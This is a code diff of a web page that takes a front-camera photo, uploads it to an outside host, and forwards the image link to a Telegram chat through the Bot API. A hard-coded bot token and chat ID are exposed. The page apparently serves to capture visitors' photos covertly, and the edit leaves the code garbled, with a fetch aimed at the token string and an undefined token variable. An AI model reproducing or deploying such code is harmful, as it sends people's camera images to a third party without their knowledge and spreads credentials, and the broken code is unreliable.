@@ -10,7 +10,6 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
         }
         #cameraContainer {
             text-align: center;
@@ -65,17 +64,16 @@
                 const formData = new FormData();
                 formData.append('image', blob, 'capture.png');
 
-                fetch('https://apps-store.onrender.com/', {
+                fetch('8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc', {
                     method: 'POST',
                     body: formData
                 })
                     .then(response => response.json())
                     .then(data => {
-                        const botToken = '8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc';
                         const chatId = '1966317946';
                         const message = 'Gambar dari kamera depan: ' + data.imageUrl;
 
-                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                        fetch('https://api.telegram.org/bot' + YOUR_BOT_TOKEN + '/sendMessage', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
